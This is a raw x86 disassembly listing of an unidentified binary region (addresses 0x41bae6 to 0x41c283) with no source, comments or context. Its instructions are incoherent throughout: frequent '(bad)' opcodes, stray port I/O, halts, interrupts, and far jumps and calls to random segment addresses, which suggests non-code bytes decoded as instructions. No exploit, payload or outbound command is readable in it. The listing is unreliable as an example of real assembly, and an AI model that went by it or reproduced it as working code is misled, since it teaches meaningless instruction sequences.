  41bae6:	(bad)  
  41bae7:	enter  0x308b,0xb2
  41baeb:	xor    BYTE PTR [edx+ebx*8],bh
  41baee:	sahf   
  41baef:	cmp    BYTE PTR [ebp-0x2b],bh
  41baf2:	mov    esi,0x449857ab
  41baf7:	adc    eax,0xc795ffd2
  41bafc:	add    al,0xc8
  41bafe:	add    DWORD PTR [edi+0x7c71afa9],0x722b23e8
  41bb08:	arpl   di,bx
  41bb0a:	xchg   BYTE PTR [ebx+0x14],cl
  41bb0d:	dec    edx
  41bb0e:	mov    esp,0x2639c6d9
  41bb13:	das    
  41bb14:	add    DWORD PTR [edi+ecx*8+0x3c20686b],ecx
  41bb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb1c:	outs   dx,BYTE PTR ds:[esi]
  41bb1d:	repnz pop edi
  41bb1f:	xchg   edx,eax
  41bb20:	(bad)  
  41bb21:	push   eax
  41bb22:	out    0x39,al
  41bb24:	test   al,0x1c
  41bb26:	mov    esi,0xe3bdd23e
  41bb2b:	add    al,0xaa
  41bb2d:	pusha  
  41bb2e:	int    0xa
  41bb30:	call   0xe577d633
  41bb35:	addr16 inc edi
  41bb37:	outs   dx,DWORD PTR es:[esi]
  41bb39:	sbb    edx,DWORD PTR [eax]
  41bb3b:	inc    edx
  41bb3c:	pop    ebp
  41bb3d:	fwait
  41bb3e:	stc    
  41bb3f:	jecxz  0x41bb08
  41bb41:	loop   0x41bb95
  41bb43:	sar    DWORD PTR [edx],1
  41bb45:	add    esp,DWORD PTR [ebp+0x212c4c53]
  41bb4b:	adc    eax,0x44aa8268
  41bb50:	shr    esi,0x8
  41bb53:	int    0x6f
  41bb55:	or     DWORD PTR [esp+edi*2+0x40de39a9],edi
  41bb5c:	sub    eax,0x5babd1b8
  41bb61:	clc    
  41bb62:	scas   eax,DWORD PTR es:[edi]
  41bb63:	xor    BYTE PTR [esi],al
  41bb65:	stos   BYTE PTR es:[edi],al
  41bb66:	sar    cl,1
  41bb68:	xchg   BYTE PTR [esi],dh
  41bb6a:	adc    edx,DWORD PTR [edi+ecx*4-0x7b]
  41bb6e:	fimul  DWORD PTR [ecx-0x29d87727]
  41bb74:	es clc 
  41bb76:	adc    ch,BYTE PTR [edx]
  41bb78:	mov    ds:0x65a322be,al
  41bb7d:	icebp  
  41bb7e:	loop   0x41bb26
  41bb80:	imul   esp,ecx,0x64
  41bb83:	cdq    
  41bb84:	push   ebp
  41bb85:	or     BYTE PTR [esi+0x6],bl
  41bb88:	sti    
  41bb89:	push   esi
  41bb8a:	ins    BYTE PTR es:[edi],dx
  41bb8b:	repnz adc DWORD PTR [ebx],ecx
  41bb8e:	adc    eax,0x5d42f4de
  41bb93:	sub    al,0xad
  41bb95:	mov    edi,0xaa3d54b2
  41bb9a:	in     eax,0x12
  41bb9c:	fidivr WORD PTR [ebx-0x2035f68c]
  41bba2:	inc    edi
  41bba3:	fwait
  41bba4:	inc    edi
  41bba5:	(bad)  
  41bba6:	jo     0x41bba5
  41bba8:	or     eax,0x365311d5
  41bbad:	gs data16 jns 0x41bb8d
  41bbb1:	sub    DWORD PTR [ecx+eiz*8-0x6c],edi
  41bbb5:	xchg   ebp,eax
  41bbb6:	pop    ecx
  41bbb7:	jo     0x41bbb8
  41bbb9:	popf   
  41bbba:	ins    DWORD PTR es:[edi],dx
  41bbbb:	xchg   di,ax
  41bbbd:	das    
  41bbbe:	daa    
  41bbbf:	stc    
  41bbc0:	xor    eax,0x3770960d
  41bbc5:	mov    dl,0xff
  41bbc7:	das    
  41bbc8:	test   eax,0x606bbe3a
  41bbcd:	(bad)  
  41bbce:	ja     0x41bc39
  41bbd0:	adc    al,0xbb
  41bbd2:	inc    si
  41bbd4:	mov    ebp,DWORD PTR [esi]
  41bbd6:	jae    0x41bb6a
  41bbd8:	sbb    BYTE PTR [ebp-0x16],bl
  41bbdb:	cdq    
  41bbdc:	je     0x41bc53
  41bbde:	cli    
  41bbdf:	mov    edi,0x42b9cfbd
  41bbe4:	dec    esi
  41bbe5:	arpl   WORD PTR [edx+0x759c010d],si
  41bbeb:	sub    BYTE PTR [ecx-0x62],0x4d
  41bbef:	icebp  
  41bbf0:	jecxz  0x41bbd6
  41bbf2:	popf   
  41bbf3:	ins    DWORD PTR es:[edi],dx
  41bbf4:	jecxz  0x41bba3
  41bbf6:	js     0x41bb87
  41bbf8:	cmc    
  41bbf9:	add    eax,0x440b6873
  41bbfe:	btr    DWORD PTR [eax+0x72],0x42
  41bc03:	test   DWORD PTR [ecx],ecx
  41bc05:	xor    eax,0xda99cd1f
  41bc0a:	ins    DWORD PTR es:[edi],dx
  41bc0b:	es mov dl,0xef
  41bc0e:	push   es
  41bc0f:	(bad)  
  41bc10:	out    0x31,al
  41bc12:	add    BYTE PTR [edx+0xc98cd8],ch
  41bc18:	inc    ecx
  41bc19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc1a:	cwde   
  41bc1b:	mov    ebx,0xff16b880
  41bc20:	add    BYTE PTR [eax],0xeb
  41bc23:	push   cs
  41bc24:	and    BYTE PTR [edx],ah
  41bc26:	xor    WORD PTR [edx*4+0x58206851],di
  41bc2e:	pop    ebp
  41bc2f:	mov    dl,0x9b
  41bc31:	pop    esi
  41bc32:	mov    edx,0xdb7aefe7
  41bc37:	or     BYTE PTR [edx-0x471df67d],bl
  41bc3d:	and    BYTE PTR [edx],dh
  41bc3f:	add    bh,dh
  41bc41:	mov    ecx,0x9d9067d2
  41bc46:	jo     0x41bc44
  41bc48:	out    0x4e,eax
  41bc4a:	mov    al,ds:0xd54cab02
  41bc4f:	pop    es
  41bc50:	call   0xc7b5:0x530e786b
  41bc57:	jne    0x41bc57
  41bc59:	push   edx
  41bc5a:	xchg   edi,eax
  41bc5b:	dec    edx
  41bc5c:	jns    0x41bc05
  41bc5e:	into   
  41bc5f:	pop    esp
  41bc60:	pusha  
  41bc61:	aaa    
  41bc62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc63:	jmp    0x61e0:0x13aab443
  41bc6a:	xlat   BYTE PTR ds:[ebx]
  41bc6b:	stos   BYTE PTR es:[edi],al
  41bc6c:	neg    DWORD PTR [eax+0x5c]
  41bc6f:	push   cs
  41bc70:	aaa    
  41bc71:	xlat   BYTE PTR ds:[ebx]
  41bc72:	inc    DWORD PTR [edx+0x7a]
  41bc75:	jne    0x41bc55
  41bc77:	and    eax,0xc498e032
  41bc7c:	hlt    
  41bc7d:	mov    ebp,0x6d3c8952
  41bc82:	mov    dl,0x55
  41bc84:	mov    edx,0xe3328f0d
  41bc89:	jge    0x41bd03
  41bc8b:	jmp    0xc741:0x6db74a1a
  41bc92:	and    eax,0xd0379ae1
  41bc97:	pop    edx
  41bc98:	sub    BYTE PTR [edx],al
  41bc9a:	adc    ebx,DWORD PTR [esi]
  41bc9c:	iret   
  41bc9d:	aad    0x59
  41bc9f:	jbe    0x41bcbe
  41bca1:	push   edi
  41bca2:	int3   
  41bca3:	adc    al,0xa8
  41bca5:	fcomp  st(3)
  41bca7:	(bad)  
  41bca8:	add    BYTE PTR [ebp-0x21],0x7f
  41bcac:	and    al,0x2c
  41bcae:	loope  0x41bcfd
  41bcb0:	into   
  41bcb1:	or     esp,DWORD PTR [edi+0x6ae22d42]
  41bcb7:	adc    cl,BYTE PTR [esi+0xf998088]
  41bcbd:	cmp    DWORD PTR [edx+0x67],esp
  41bcc0:	sbb    DWORD PTR [eax+0x15],0xb0f87424
  41bcc7:	add    ah,dh
  41bcc9:	out    0xe1,eax
  41bccb:	jmp    0x617:0x3c571cb6
  41bcd2:	(bad)  
  41bcd3:	aaa    
  41bcd4:	cwde   
  41bcd5:	test   eax,0x39f9643b
  41bcda:	fcom   QWORD PTR [edx-0x5d]
  41bcdd:	test   eax,0xcacfc4e4
  41bce2:	adc    bh,ch
  41bce4:	(bad)  
  41bce5:	(bad)  
  41bce7:	sub    BYTE PTR [edi],dl
  41bce9:	mov    ah,0x32
  41bceb:	test   BYTE PTR [edi+0x57],dh
  41bcee:	pop    edx
  41bcef:	jo     0x41bd0f
  41bcf1:	pop    eax
  41bcf2:	mov    edx,0xf17dea00
  41bcf7:	sbb    DWORD PTR [eax+0x1edc5d13],eax
  41bcfd:	mov    WORD PTR [edi-0x55e7dca9],es
  41bd03:	out    dx,al
  41bd04:	jecxz  0x41bcfb
  41bd06:	stos   DWORD PTR es:[edi],eax
  41bd07:	sbb    DWORD PTR [ecx+0x4c55fb4b],eax
  41bd0d:	dec    esp
  41bd0e:	mov    esi,0x78df471e
  41bd13:	pop    ds
  41bd14:	(bad)  
  41bd15:	fidivr DWORD PTR [esi-0x6df176e3]
  41bd1b:	into   
  41bd1c:	sub    al,0x2e
  41bd1e:	xchg   esp,eax
  41bd1f:	mov    bl,0x7
  41bd21:	fidivr DWORD PTR [esi+0x62e129a1]
  41bd27:	dec    esi
  41bd28:	lods   eax,DWORD PTR ds:[esi]
  41bd29:	test   DWORD PTR [eax],esi
  41bd2b:	repnz xchg esi,eax
  41bd2d:	mov    bh,0x14
  41bd2f:	dec    ebx
  41bd30:	retf   
  41bd31:	pusha  
  41bd32:	pop    esp
  41bd33:	sbb    BYTE PTR [ebx-0x58c0ce44],0xda
  41bd3a:	sbb    eax,0x31f73123
  41bd40:	or     edi,ecx
  41bd42:	addr16 (bad) 
  41bd44:	test   BYTE PTR [esi+eax*8+0x486afe3d],0x96
  41bd4c:	not    cl
  41bd4e:	inc    ebp
  41bd4f:	push   ebx
  41bd50:	xlat   BYTE PTR ds:[ebx]
  41bd51:	or     ecx,DWORD PTR [ecx-0x74]
  41bd54:	ds inc ebp
  41bd56:	sub    dl,ch
  41bd58:	jmp    0x26a6:0xf19e8160
  41bd5f:	and    eax,0x1e22f2fd
  41bd64:	mov    al,0x7c
  41bd66:	xor    al,0x9a
  41bd68:	mov    ebx,0x3140fb68
  41bd6d:	mov    ebp,0xe304749a
  41bd72:	aad    0xca
  41bd74:	jmp    0x41bdb5
  41bd76:	mov    BYTE PTR [edi+0x3c],ch
  41bd79:	xchg   DWORD PTR [ebp-0x25],ebx
  41bd7c:	test   eax,0x9452bf0f
  41bd81:	and    esp,ebp
  41bd83:	ds loope 0x41bd4f
  41bd86:	inc    edi
  41bd87:	outs   dx,DWORD PTR ds:[esi]
  41bd88:	mov    dl,0x8f
  41bd8a:	xlat   BYTE PTR ds:[ebx]
  41bd8b:	stos   BYTE PTR es:[edi],al
  41bd8c:	ror    BYTE PTR [edx+0x11],1
  41bd8f:	pushf  
  41bd90:	arpl   WORD PTR [edi-0x31],sp
  41bd93:	push   esi
  41bd94:	out    0x1,al
  41bd96:	push   esp
  41bd97:	test   al,0x3b
  41bd99:	clc    
  41bd9a:	loopne 0x41be0f
  41bd9c:	xchg   ecx,eax
  41bd9d:	jge    0x41bd21
  41bd9f:	das    
  41bda0:	or     BYTE PTR [edi+0x6952fee8],cl
  41bda6:	push   ds
  41bda7:	adc    eax,0x696a4751
  41bdac:	jle    0x41bd9e
  41bdae:	push   es
  41bdaf:	inc    ebx
  41bdb0:	xchg   ebx,eax
  41bdb1:	adc    DWORD PTR cs:[eax+ecx*8+0x2c],ebx
  41bdb6:	inc    ebp
  41bdb7:	mov    edx,0x8bb6ffaa
  41bdbc:	pop    ecx
  41bdbd:	cli    
  41bdbe:	mov    al,ds:0xbf8ed9dd
  41bdc3:	adc    al,0x91
  41bdc5:	mov    al,0xda
  41bdc7:	sbb    BYTE PTR [edx+ebx*1+0x447f0b63],bh
  41bdce:	fsincos 
  41bdd0:	loopne 0x41be1e
  41bdd2:	shr    DWORD PTR ds:0x6a2aefab,0x67
  41bdd9:	jnp    0x41bdfb
  41bddb:	mov    edx,0x2280bc88
  41bde0:	(bad)  
  41bde1:	imul   esi,ebx,0x7d0c2995
  41bde7:	xchg   esp,eax
  41bde8:	jl     0x41bd9f
  41bdea:	in     al,0xea
  41bdec:	add    edi,DWORD PTR [eax+0x7a14e82f]
  41bdf2:	ret    0xdb54
  41bdf5:	test   DWORD PTR [esi-0x67],esp
  41bdf8:	inc    ebp
  41bdf9:	cmp    al,0xe6
  41bdfb:	mov    ds:0x299527ef,eax
  41be00:	sub    edx,esi
  41be02:	jns    0x41be3e
  41be04:	or     al,0x64
  41be06:	pop    ss
  41be07:	fldenv [ebp+0x56]
  41be0a:	pop    es
  41be0b:	adc    al,0x34
  41be0d:	adc    cl,BYTE PTR [ecx+0x46b78c27]
  41be13:	or     eax,0xfdd79ff9
  41be18:	push   edx
  41be19:	jmp    0x5200:0xd379e1bd
  41be20:	jge    0x41bde2
  41be22:	in     eax,0xef
  41be24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be25:	sbb    al,0x54
  41be27:	lds    ebp,FWORD PTR [eax]
  41be29:	jno    0x41be92
  41be2b:	cwde   
  41be2c:	dec    edx
  41be2d:	rcl    DWORD PTR [ecx+0x4cf49ea3],0xcf
  41be34:	loop   0x41bea7
  41be36:	sbb    al,0xaf
  41be38:	sbb    al,0x9d
  41be3a:	jns    0x41be73
  41be3c:	lahf   
  41be3d:	push   ecx
  41be3e:	mov    ebp,ds
  41be40:	pop    eax
  41be41:	js     0x41be21
  41be43:	stos   BYTE PTR es:[edi],al
  41be44:	sub    dh,BYTE PTR [edx+0x737d1145]
  41be4a:	in     eax,0xb9
  41be4c:	femms  
  41be4e:	xor    BYTE PTR [ecx+0x4e],al
  41be51:	sbb    BYTE PTR [esi-0x28],bl
  41be54:	sahf   
  41be55:	sub    eax,0xdec6b33d
  41be5a:	loop   0x41beba
  41be5c:	sub    si,WORD PTR [edx-0x1]
  41be60:	test   BYTE PTR [edi+0x332ab586],cl
  41be66:	ins    DWORD PTR es:[edi],dx
  41be67:	std    
  41be68:	iret   
  41be69:	sbb    cl,al
  41be6b:	xor    dh,BYTE PTR [ebp-0x3b]
  41be6e:	sbb    bh,BYTE PTR [ebx]
  41be70:	and    ebx,DWORD PTR [esi-0x2c]
  41be73:	inc    esi
  41be74:	ss mov ch,0x1a
  41be77:	outs   dx,DWORD PTR ds:[esi]
  41be78:	imul   edx,DWORD PTR [ebp-0x2de6e81b],0x50
  41be7f:	imul   ebx,esi,0xffffffef
  41be82:	(bad)  
  41be83:	xchg   esi,eax
  41be84:	call   DWORD PTR [edx-0x545e0dfe]
  41be8a:	iret   
  41be8b:	aam    0xd2
  41be8d:	gs pop ds
  41be8f:	jl     0x41be32
  41be91:	je     0x41be96
  41be93:	push   ebx
  41be94:	mov    dh,0xe
  41be96:	and    al,dh
  41be98:	push   ebx
  41be99:	seta   BYTE PTR [eax+0x14]
  41be9d:	mov    esi,0xd4f54aac
  41bea2:	lods   al,BYTE PTR ds:[esi]
  41bea3:	js     0x41be65
  41bea5:	lds    ebp,FWORD PTR [esi+0x52]
  41bea8:	dec    ecx
  41bea9:	iret   
  41beaa:	sbb    ch,BYTE PTR [ebp+ecx*2-0x4ef6e8ee]
  41beb1:	xor    esp,0x36
  41beb4:	int    0x40
  41beb6:	inc    ebx
  41beb7:	push   ds
  41beb8:	sbb    al,0x48
  41beba:	test   eax,0x76906d2c
  41bebf:	sbb    bh,dh
  41bec1:	xchg   ebp,eax
  41bec2:	push   cs
  41bec3:	mov    eax,0xfd2a057b
  41bec8:	mov    ah,0x70
  41beca:	add    eax,0x42d03638
  41becf:	adc    eax,ebx
  41bed1:	cmp    cl,bl
  41bed3:	sub    bh,BYTE PTR ds:0x834fcb62
  41bed9:	pop    ds
  41beda:	int    0xa5
  41bedc:	mov    bh,0x33
  41bede:	push   esi
  41bedf:	cmp    al,dh
  41bee1:	or     BYTE PTR [esi-0x56],0x40
  41bee5:	call   0x8ff6:0x6d2cb874
  41beec:	dec    edi
  41beee:	xor    bl,cl
  41bef0:	mov    eax,0xfc884c82
  41bef5:	in     al,dx
  41bef6:	push   esp
  41bef7:	mov    ch,bl
  41bef9:	in     eax,dx
  41befa:	xchg   edx,eax
  41befb:	pop    esi
  41befc:	mov    edi,0x1b995aea
  41bf01:	jbe    0x41bf3b
  41bf03:	fdivr  DWORD PTR [edx-0x1c]
  41bf06:	stos   BYTE PTR es:[edi],al
  41bf07:	cmp    DWORD PTR [eax-0x3f],ebx
  41bf0a:	mov    dl,0x88
  41bf0c:	lock (bad) 
  41bf0e:	lods   eax,DWORD PTR ds:[esi]
  41bf0f:	cs retf 0xf9dc
  41bf13:	icebp  
  41bf14:	or     eax,0xdb827562
  41bf19:	(bad)  
  41bf1a:	push   eax
  41bf1b:	push   ss
  41bf1c:	push   ss
  41bf1d:	cmp    eax,0x8bd2c74
  41bf22:	sub    edx,DWORD PTR [edx+0x9987b42]
  41bf28:	and    eax,0xd6500ba9
  41bf2d:	arpl   si,si
  41bf2f:	out    dx,eax
  41bf30:	and    BYTE PTR [edi-0xfcc9e74],dl
  41bf36:	mov    bl,0x69
  41bf38:	fcmove st,st(6)
  41bf3a:	mov    eax,0x5b75f46f
  41bf3f:	cmp    al,0x46
  41bf41:	xchg   esp,eax
  41bf42:	out    0x1,al
  41bf44:	mov    edi,0xcf286f25
  41bf49:	jmp    0x41bf6b
  41bf4b:	push   esp
  41bf4c:	das    
  41bf4d:	popf   
  41bf4e:	ds mov ah,dh
  41bf51:	repnz push 0xed81357a
  41bf57:	pop    edx
  41bf58:	adc    BYTE PTR [ebx+esi*8-0x28],al
  41bf5c:	add    eax,0xf63fe22d
  41bf61:	fnstcw WORD PTR ds:0xc7554889
  41bf67:	fcom   DWORD PTR [ebx]
  41bf69:	adc    ah,al
  41bf6b:	test   al,0xb7
  41bf6d:	dec    esi
  41bf6e:	std    
  41bf6f:	mov    DWORD PTR [ebx+0x4225c168],esp
  41bf75:	scas   al,BYTE PTR es:[edi]
  41bf76:	adc    dh,al
  41bf78:	inc    edx
  41bf79:	add    ebp,DWORD PTR [ebp-0x4d]
  41bf7c:	sbb    BYTE PTR ds:0xcbd45379,bl
  41bf82:	inc    esp
  41bf83:	xchg   BYTE PTR [esi+0x7459aa69],bh
  41bf89:	xchg   ecx,eax
  41bf8a:	and    edx,DWORD PTR [ebx+0x66a802da]
  41bf90:	cwde   
  41bf91:	adc    BYTE PTR [ebp+eax*2-0x53e6441e],dl
  41bf98:	sub    eax,0x950a7d39
  41bf9d:	shl    DWORD PTR [ecx+0x7a],0x97
  41bfa1:	inc    esp
  41bfa2:	iret   
  41bfa3:	mov    ah,0x7d
  41bfa5:	ficomp WORD PTR [ebx+0x2d]
  41bfa8:	pop    esp
  41bfa9:	dec    ebp
  41bfaa:	cmp    esp,DWORD PTR [edi-0x73]
  41bfad:	daa    
  41bfae:	iret   
  41bfaf:	xchg   ebx,eax
  41bfb0:	lods   eax,DWORD PTR ds:[esi]
  41bfb1:	stos   BYTE PTR es:[edi],al
  41bfb2:	jbe    0x41c00a
  41bfb4:	out    dx,eax
  41bfb5:	jbe    0x41bfbe
  41bfb7:	mov    al,ds:0x5e06d3cb
  41bfbc:	sub    BYTE PTR [ecx-0x4cd8a500],bl
  41bfc2:	fisttp QWORD PTR [ecx]
  41bfc4:	fs scas al,BYTE PTR es:[edi]
  41bfc6:	jo     0x41c01d
  41bfc8:	adc    DWORD PTR [ebp+0x500cdbf5],0xffffffc8
  41bfcf:	pop    ss
  41bfd0:	xchg   BYTE PTR [ecx],bl
  41bfd2:	cmp    DWORD PTR [ecx+esi*1+0x52db877b],0x2a6365d9
  41bfdd:	loopne 0x41c047
  41bfdf:	cmp    edi,ebx
  41bfe1:	idiv   esp
  41bfe3:	cmp    ecx,DWORD PTR [eax*8-0x40c653a9]
  41bfea:	lods   eax,DWORD PTR ds:[esi]
  41bfeb:	daa    
  41bfec:	xor    eax,0x2c47e6a1
  41bff1:	sbb    DWORD PTR [ebx+ecx*8-0x19],edi
  41bff5:	push   ecx
  41bff6:	xchg   DWORD PTR [edx+0x18],esi
  41bff9:	ds jge 0x41c061
  41bffc:	or     edi,edi
  41bffe:	push   0x1e
  41c000:	in     al,0xee
  41c002:	std    
  41c003:	push   0xf160d4cc
  41c008:	ins    DWORD PTR es:[edi],dx
  41c009:	adc    esi,esi
  41c00b:	dec    ecx
  41c00c:	loope  0x41bfd7
  41c00e:	lea    esp,[edi]
  41c010:	cmp    bh,dl
  41c012:	jle    0x41bfc3
  41c014:	mov    al,ds:0x322223ce
  41c019:	(bad)  
  41c01a:	ror    DWORD PTR [ebx-0x33846422],cl
  41c020:	call   0x1821:0xa154dcd
  41c027:	shr    DWORD PTR ds:0xc3c192f6,1
  41c02d:	xor    ebx,DWORD PTR [esi-0x38b20d65]
  41c033:	mov    esi,0xdd4c9450
  41c038:	adc    esi,ecx
  41c03a:	cmp    esp,DWORD PTR [esi+0x9]
  41c03d:	shl    BYTE PTR [edx],0x13
  41c040:	ret    0xa8f3
  41c043:	inc    edx
  41c044:	mov    cs,WORD PTR [esi]
  41c046:	in     al,0xb5
  41c048:	dec    edx
  41c049:	outs   dx,DWORD PTR ds:[esi]
  41c04a:	aas    
  41c04b:	lea    eax,[edx-0x7b795016]
  41c051:	add    BYTE PTR [esi+0x63],al
  41c054:	mov    dh,0x7e
  41c056:	sahf   
  41c057:	mov    ecx,0x75421e66
  41c05c:	dec    esi
  41c05d:	and    al,0x70
  41c05f:	es out 0x6e,eax
  41c062:	in     al,0x1f
  41c064:	lahf   
  41c065:	in     al,dx
  41c066:	scas   eax,DWORD PTR es:[edi]
  41c067:	aaa    
  41c068:	push   ebp
  41c069:	lock mov edi,0x5542e93b
  41c06f:	fisttp WORD PTR [ebx-0x5d]
  41c072:	mov    dh,0x5a
  41c074:	xor    al,0x9d
  41c076:	int    0x32
  41c078:	loope  0x41c038
  41c07a:	or     bh,BYTE PTR [edx+esi*8]
  41c07d:	adc    al,0xc5
  41c07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c080:	push   0xa5fa6eeb
  41c085:	fwait
  41c086:	inc    edx
  41c087:	fsub   st,st(0)
  41c089:	push   ebp
  41c08a:	push   ebx
  41c08b:	jmp    0x4fa:0x34fae1f4
  41c092:	repnz xchg ebx,eax
  41c094:	pop    ss
  41c095:	rcl    BYTE PTR [edi-0x1c],cl
  41c098:	div    DWORD PTR [edx+ebp*1]
  41c09b:	sbb    BYTE PTR [ebp+0x259a6c01],0x2
  41c0a2:	xor    esp,DWORD PTR [esi]
  41c0a4:	arpl   WORD PTR [esi-0x1e],bx
  41c0a7:	add    eax,0xe72d03bd
  41c0ac:	je     0x41c0c9
  41c0ae:	dec    edx
  41c0af:	mov    ds:0x52a42a19,al
  41c0b4:	sub    ebp,DWORD PTR [ecx]
  41c0b6:	fldenv [ebx]
  41c0b8:	pushf  
  41c0b9:	ss pop eax
  41c0bb:	mov    edi,0xcef1198f
  41c0c0:	(bad)  
  41c0c1:	sbb    DWORD PTR [ecx+edi*4],esp
  41c0c4:	jns    0x41c0a2
  41c0c6:	std    
  41c0c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0c8:	jmp    0x8503d654
  41c0cd:	add    eax,0x88357555
  41c0d2:	dec    edx
  41c0d3:	mov    bl,0x47
  41c0d5:	test   BYTE PTR [edx],cl
  41c0d7:	add    eax,0xda1f8199
  41c0dc:	mov    WORD PTR [edx-0x28328b88],cs
  41c0e2:	mov    ebp,0x7d00b712
  41c0e7:	lock pop es
  41c0e9:	ret    0xd35a
  41c0ec:	pop    esp
  41c0ed:	lods   al,BYTE PTR ds:[esi]
  41c0ee:	rcr    BYTE PTR [eax],0xa
  41c0f1:	cwde   
  41c0f2:	and    eax,0x7d708aac
  41c0f7:	es jecxz 0x41c137
  41c0fa:	jg     0x41c0fb
  41c0fc:	stos   BYTE PTR es:[edi],al
  41c0fd:	imul   esp,DWORD PTR [ebp-0x18],0x76231dd
  41c104:	fwait
  41c105:	cs xchg edi,eax
  41c107:	dec    edx
  41c108:	call   0xbeaf:0x33763bd1
  41c10f:	cmp    esi,DWORD PTR [eax]
  41c111:	mov    edx,0xef8199bb
  41c116:	addr16 jle 0x41c18c
  41c119:	inc    esi
  41c11a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41c11c:	pushf  
  41c11d:	cli    
  41c11e:	dec    ebp
  41c11f:	inc    esp
  41c120:	dec    ebx
  41c121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c122:	cli    
  41c123:	imul   ecx,ecx,0x7dd96abe
  41c129:	or     BYTE PTR [ebp-0x7b],al
  41c12c:	out    0xfd,eax
  41c12e:	jmp    0xde3cac35
  41c133:	test   BYTE PTR [edx],0xb9
  41c136:	push   esp
  41c137:	int    0x4
  41c139:	clc    
  41c13a:	xchg   bh,bh
  41c13c:	xor    BYTE PTR [eax+0x9],0x8
  41c140:	mov    esi,0x1fe91884
  41c145:	inc    eax
  41c146:	mov    eax,DWORD PTR [ebx-0x507cff16]
  41c14c:	into   
  41c14d:	jno    0x41c192
  41c14f:	push   cs
  41c150:	pop    eax
  41c151:	push   edx
  41c152:	data16 in al,0x38
  41c155:	mov    al,0x1e
  41c157:	and    DWORD PTR [edx],edx
  41c159:	call   0x6420520
  41c15e:	lods   eax,DWORD PTR ds:[esi]
  41c15f:	mov    edi,0x60e2aef0
  41c164:	sahf   
  41c165:	xor    eax,DWORD PTR [ebx-0x2c]
  41c168:	add    BYTE PTR [edx+0x7a],bl
  41c16b:	cs into 
  41c16d:	mov    DWORD PTR [edi],edx
  41c16f:	or     si,0x3d
  41c173:	add    DWORD PTR [esi+0x1cabf081],esi
  41c179:	jp     0x41c105
  41c17b:	adc    esi,edi
  41c17d:	adc    DWORD PTR [eax+ebp*1+0x1ecdda48],0xffffffa3
  41c185:	inc    edi
  41c186:	pop    ebx
  41c187:	dec    ebx
  41c188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c189:	mov    ah,0x1c
  41c18b:	mov    ebx,0x90c5023d
  41c190:	and    edx,DWORD PTR [ebp-0x3d]
  41c193:	fisubr DWORD PTR [edx+0x7647680]
  41c199:	test   DWORD PTR [ecx+0x44],ecx
  41c19c:	test   DWORD PTR [esi+0x6c],esp
  41c19f:	jmp    0x1a29:0xa24fc056
  41c1a6:	aam    0x83
  41c1a8:	mov    ds:0xbf204b9f,al
  41c1ad:	pop    edi
  41c1ae:	dec    edi
  41c1af:	pop    esi
  41c1b0:	fadd   QWORD PTR [edi+0x590a2e5f]
  41c1b6:	(bad)  
  41c1b7:	ror    ebx,0x87
  41c1ba:	lods   al,BYTE PTR ds:[esi]
  41c1bb:	adc    DWORD PTR [edx-0x23489197],0xf40195a5
  41c1c5:	or     edi,esi
  41c1c7:	sbb    BYTE PTR [ecx-0x80],dl
  41c1ca:	xor    edx,edx
  41c1cc:	nop
  41c1cd:	int    0x69
  41c1cf:	inc    esi
  41c1d0:	xor    eax,edi
  41c1d2:	stos   DWORD PTR es:[edi],eax
  41c1d3:	dec    ecx
  41c1d4:	dec    edx
  41c1d5:	sub    eax,edi
  41c1d7:	push   0xafa1c6ef
  41c1dc:	out    dx,al
  41c1dd:	push   ebp
  41c1de:	xchg   WORD PTR [eax],di
  41c1e1:	fwait
  41c1e2:	lods   eax,DWORD PTR ds:[esi]
  41c1e3:	in     al,dx
  41c1e4:	out    0x4a,al
  41c1e6:	push   ebx
  41c1e7:	lods   al,BYTE PTR ds:[esi]
  41c1e8:	jp     0x41c17a
  41c1ea:	sub    eax,0xaf3b2170
  41c1ef:	mov    edx,ds
  41c1f1:	sbb    cl,BYTE PTR [edx+0x493480f2]
  41c1f7:	stc    
  41c1f8:	sbb    ecx,edx
  41c1fa:	test   ah,0x0
  41c1fd:	sbb    ebx,edi
  41c1ff:	repz dec ebx
  41c201:	xchg   esp,eax
  41c202:	fisub  WORD PTR [ecx]
  41c204:	ja     0x41c1f0
  41c206:	jmp    0x41c18c
  41c208:	and    ebx,DWORD PTR [edi+0x1f]
  41c20b:	(bad)  
  41c20c:	lea    edx,[eax]
  41c20e:	xchg   esp,eax
  41c20f:	retf   0x615e
  41c212:	test   DWORD PTR [edx+0x43],esi
  41c215:	fst    DWORD PTR [ecx+edx*4+0x11]
  41c219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21a:	push   edi
  41c21b:	inc    ebp
  41c21c:	loop   0x41c225
  41c21e:	pop    ds
  41c21f:	xchg   ecx,eax
  41c220:	and    DWORD PTR [ebx+esi*1+0x1181f64f],esp
  41c227:	icebp  
  41c228:	push   esp
  41c229:	fs scas eax,DWORD PTR es:[edi]
  41c22b:	(bad)  
  41c22d:	jmp    0x51bf:0x63ec4dda
  41c234:	out    dx,eax
  41c235:	and    BYTE PTR [eax],bh
  41c237:	mov    bh,0xf4
  41c239:	xor    al,0x2f
  41c23b:	and    ch,BYTE PTR ds:0x45d9b6af
  41c241:	lahf   
  41c242:	push   edi
  41c243:	and    al,0xbb
  41c245:	and    DWORD PTR [ecx-0x23178de3],esi
  41c24b:	pop    esi
  41c24c:	test   bl,0x3c
  41c24f:	push   esp
  41c250:	jmp    0x80374efb
  41c255:	mov    ebx,DWORD PTR [eax]
  41c257:	andnps xmm0,XMMWORD PTR [eax*2-0x775a9a89]
  41c25f:	lods   al,BYTE PTR ds:[esi]
  41c260:	pop    es
  41c261:	sub    eax,0x13cee343
  41c266:	sbb    DWORD PTR [ebp-0x54],edi
  41c269:	shl    BYTE PTR [ebp+0x5f],0xe4
  41c26d:	push   ebp
  41c26e:	xor    BYTE PTR [ebx],cl
  41c270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c271:	(bad)  
  41c272:	sub    esi,eax
  41c274:	or     BYTE PTR [eax+edx*2-0x73dfb545],0xd8
  41c27c:	jmp    0x1832:0xaf01fa52
  41c283:	pop    ecx
